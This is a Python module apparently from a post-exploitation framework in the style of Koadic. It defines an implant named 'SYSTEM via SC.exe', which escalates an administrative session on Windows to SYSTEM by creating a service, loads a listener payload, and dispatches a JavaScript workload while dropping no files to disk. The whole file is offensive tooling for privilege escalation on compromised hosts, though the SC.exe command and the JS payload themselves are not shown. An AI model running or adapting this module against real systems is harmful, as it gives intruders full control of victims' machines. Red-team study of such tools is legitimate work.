import core.job
import core.implant
import uuid

class CreateServiceJob(core.job.Job):
    def create(self):
        id = self.options.get("PAYLOAD")
        payload = self.load_payload(id)
        self.options.set("PAYLOAD_DATA", payload)
        if self.session_id == -1:
            return
        if self.session.elevated != 1 and self.options.get("IGNOREADMIN") == "false":
            self.error("0", "This job requires an elevated session. Set IGNOREADMIN to true to run anyway.", "Not elevated", "")
            return False

    def done(self):
        self.display()

    def display(self):
        self.results = "Completed"

class CreateServiceImplant(core.implant.Implant):

    NAME = "SYSTEM via SC.exe"
    DESCRIPTION = "Elevate from an administrative session to SYSTEM via SC.exe. Drops no files to disk."
    AUTHORS = ["TheNaterz", "jennamagius"]
    STATE = "implant/elevate/system_createservice"

    def load(self):
        self.options.register("PAYLOAD", "", "run listeners for a list of IDs")
        self.options.register("PAYLOAD_DATA", "", "the actual data", hidden=True)

    def job(self):
        return CreateServiceJob

    def run(self):
        id = self.options.get("PAYLOAD")
        payload = self.load_payload(id)

        if payload is None:
            self.shell.print_error("Payload %s not found." % id)
            return

        workloads = {}
        workloads["js"] = "data/implant/elevate/system_createservice.js"

        self.dispatch(workloads, self.job)
